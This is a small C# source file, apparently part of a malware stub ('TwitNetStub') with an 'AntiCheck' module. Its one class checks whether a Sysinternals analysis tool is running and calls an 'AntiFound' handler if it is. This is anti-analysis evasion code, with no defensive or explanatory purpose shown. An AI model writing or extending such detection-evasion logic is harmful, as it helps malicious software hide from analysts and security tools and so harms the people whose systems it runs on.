//using System;
//using System.Collections.Generic;
//using System.Text;

namespace TwitNetStub.Util.AntiCheck.Anti
{
sealed class SysInternals
    {
        public SysInternals()
        {
            if (new CheckProcess().IsProcessRunning("Sysinternals: www.sysinternals.com"))
            {
                new AntiFound();
            }
            //System.GC.Collect();
        }
    }
}
